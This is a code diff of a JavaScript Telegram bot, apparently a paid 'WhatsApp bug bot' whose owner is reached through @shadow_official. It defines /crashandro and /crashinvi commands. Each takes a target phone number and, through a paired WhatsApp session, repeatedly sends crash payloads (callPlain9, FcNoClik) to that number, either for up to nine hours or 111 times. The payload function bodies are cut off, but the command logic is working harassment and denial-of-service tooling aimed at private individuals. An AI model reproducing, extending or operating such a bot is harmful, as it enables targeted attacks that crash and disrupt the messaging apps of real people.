+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact the owner to get premium access. @shadow_official V2");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`
-╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired
-║ any WhatsApp number.
-║
-║ Use /reqpair first.
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first. V2");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. ACTIVE SESSION CHECK ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`
-╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Your WhatsApp session
-║ is not active.
-║
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════════╝ V2`);
+    return sendWithBanner("SOMETHING WENT WRONG: Your WhatsApp session is not active. Please pair again: /reqpair V2");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. INPUT VALIDATION ───
   if (!input || !hours || isNaN(hours) || hours < 1 || hours > 9) {
-    return sendWithBanner(`
-╔═❖ CRASHANDRO ❖═╗
-║
-║ Usage:
-║ /crashandro <number> <hours>
-║
-║ Example:
-║ /crashandro 923001112233 2
-║
-║ Hours Range:
-║ 1 - 9 only
-║
-╚═════════════════╝ V2`);
+    return sendWithBanner("CRASHANDRO: Usage: /crashandro <number> <hours>. Example: /crashandro 923001112233 2. Hours Range: 1 - 9 only V2");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`
-╔═❖ INVALID NUMBER ❖═╗
-║
-║ Provide a valid
-║ international number.
-║
-║ Example:
-║ 923123456789
-║
-╚═══════════════════╝ V2`);
+    return sendWithBanner("INVALID NUMBER: Provide a valid international number. Example: 923123456789 V2");
   }
-
   const target = `${input}@s.whatsapp.net`;
   const duration = hours * 60 * 60 * 1000;
   const endTime = Date.now() + duration;
-
-  // ─── 5. MAIN EXECUTION ───
   try {
-
-    await sendWithBanner(`
-╔═❖ CRASHANDRO STARTED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Runtime:
-║ ${hours} Hour(s)
-║
-╚═══════════════════════╝ V2`);
-
-    console.log(chalk.blue(`🔥 CrashAndro started for ${hours}h → ${target}`));
-
+    await sendWithBanner(`CRASHANDRO STARTED: Target: ${input}, Runtime: ${hours} Hour(s) V2`);
+    console.log(chalk.blue(`CrashAndro started for ${hours}h -> ${target}`));
     let cycle = 0;
-
     while (Date.now() < endTime) {
-
       await callPlain9(sock, target);
       await sleep(1200);
-      
-
-      console.log(chalk.blueBright(`⚡Crash Cycle ${++cycle} executed → ${target}`));
+      console.log(chalk.blueBright(`Crash Cycle ${++cycle} executed -> ${target}`));
     }
-
-    return sendWithBanner(`
-╔═❖ CRASHANDRO COMPLETED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Total Runtime:
-║ ${hours} Hour(s)
-║
-╚═══════════════════════╝ V2`);
-
+    return sendWithBanner(`CRASHANDRO COMPLETED: Target: ${input}, Total Runtime: ${hours} Hour(s) V2`);
   } catch (err) {
     console.error("Error in /crashandro:", err);
-
-    return sendWithBanner(`
-╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Process stopped.
-║ Please pair again:
-║ /reqpair
-║
-╚═══════════════════════╝ V2`);
+    return sendWithBanner("SOMETHING WENT WRONG: Process stopped. Please pair again: /reqpair V2");
   }
 });
 
-// ──────────────── Handler: /infinity ────────────────
 bot.onText(/\/crashinvi(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`
-╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a
-║ premium user.
-║
-║ Contact owner to get
-║ premium access. @shadow_official
-║
-╚═════════════════════╝`);
+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact owner to get premium access. @shadow_official");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`
-╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired
-║ any WhatsApp number.
-║
-║ Use /reqpair first.
-║
-╚═════════════════════╝`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first.");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. CHECK ACTIVE SESSION ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`
-╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Your WhatsApp session
-║ is not active.
-║
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Your WhatsApp session is not active. Please pair again: /reqpair");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. TARGET NUMBER VALIDATION ───
   if (!input) {
-    return sendWithBanner(`
-╔═❖ crashinvi ❖═╗
-║
-║ Provide a valid
-║ phone number:
-║
-║ /crashinvi 92333xxxxxx
-║
-╚═════════════════════╝`);
+    return sendWithBanner("crashinvi: Provide a valid phone number: /crashinvi 92333xxxxxx");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`
-╔═❖ INVALID NUMBER ❖═╗
-║
-║ Provide a valid
-║ international number.
-║
-║ e.g., 923123456789
-║
-╚═════════════════════╝`);
+    return sendWithBanner("INVALID NUMBER: Provide a valid international number. e.g., 923123456789");
   }
-
   const target = `${input}@s.whatsapp.net`;
-
-  // ─── 5. MAIN BUG PROCESS ───
   try {
-
-    await sendWithBanner(`
-╔═❖ crashinvi STARTED ❖═╗
-║
-║ Sending bug to:
-║ ${input}
-║
-╚═════════════════════╝`);
-
-    console.log(chalk.blue(`🔥 crashinvi sending to ${target}...`));
-
+    await sendWithBanner(`crashinvi STARTED: Sending bug to: ${input}`);
+    console.log(chalk.blue(`crashinvi sending to ${target}...`));
     for (let i = 0; i < 111; i++) {
-
       await FcNoClik(sock, target);
-  
-
-      console.log(chalk.blueBright(`⚡ [${i + 1}/1] crashinvi sent to ${target}`));
+      console.log(chalk.blueBright(`[${i + 1}/1] crashinvi sent to ${target}`));
     }
-
-    return sendWithBanner(`
-╔═❖ crashinvi DONE ❖═╗
-║
-║ Completed for:
-║ ${input}
-║
-╚═════════════════════╝`);
-
+    return sendWithBanner(`crashinvi DONE: Completed for: ${input}`);
   } catch (err) {
     console.error("Error in /crashinvi:", err);
-
-    return sendWithBanner(`
-╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Process stopped.
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Process stopped. Please pair again: /reqpair");
   }
 });
-
 //Function bug Infi
 
 async function FcNoClik(sock, target) {
